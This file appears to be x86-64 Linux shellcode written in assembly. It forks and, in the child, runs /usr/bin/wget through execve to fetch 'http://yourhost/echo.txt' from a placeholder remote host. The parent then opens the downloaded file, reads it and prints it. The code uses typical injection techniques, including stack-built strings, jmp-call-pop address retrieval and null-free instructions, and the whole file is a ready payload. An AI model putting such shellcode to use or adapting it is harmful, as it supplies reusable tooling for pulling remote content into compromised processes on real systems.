;/***********************************************************************/
;/*Author	: DaBDouB-MosiKaR							                                */
;/*Date		: 26/06                                         							*/
;/*Desc		: Download then read and print to the screen		              */
;/***********************************************************************/

global _start
section .text
_start:
	
	;fork
	xor rax, rax
	mov al, 0x39
	syscall
	or rax, rax
	jz Child

	;wait
	mov rsi, rax
	xor rdi, rdi
	mul rdi
  inc rdi
	mov r10b, 4
	mov al, 247
  syscall
	
	;open file 
	;echo.txt
	xor rsi, rsi
	mul rsi
	push rsi
	mov rbx, 0x7478742e6f686365
	push rbx
	mov rdi, rsp
	mov al, 0x02
	syscall
	
	;read the file
	xchg rdi, rax
	xchg rax, rsi
	xor rax, rax
	xor rdx, rdx
	mov dl, 0xFF
	syscall

	;write
	xchg rax, rdx
	xor rdi, rdi
	inc rdi
	mov rax, rdi
	syscall
	
	xor rax, rax
	mov al, 60
	syscall

Child:
	;pop rsi
	xor rax, rax
	push rax
	mov rbx, 0x746567772f6e6962
	push rbx
	mov rbx, 0x2f7273752f2f2f2f
	push rbx
	mov rdi, rsp
	push rax
	mov rdx, rsp
	jmp short findAdress
adress:
	pop rsi
	push rsi
	push rdi
	mov rsi, rsp
	xor rax, rax
	mov al, 0x3B ; execve
	syscall
	xor rax, rax
	mov al, 60
	syscall

findAdress:
	call adress
  lien:           db      "http://yourhost/echo.txt"
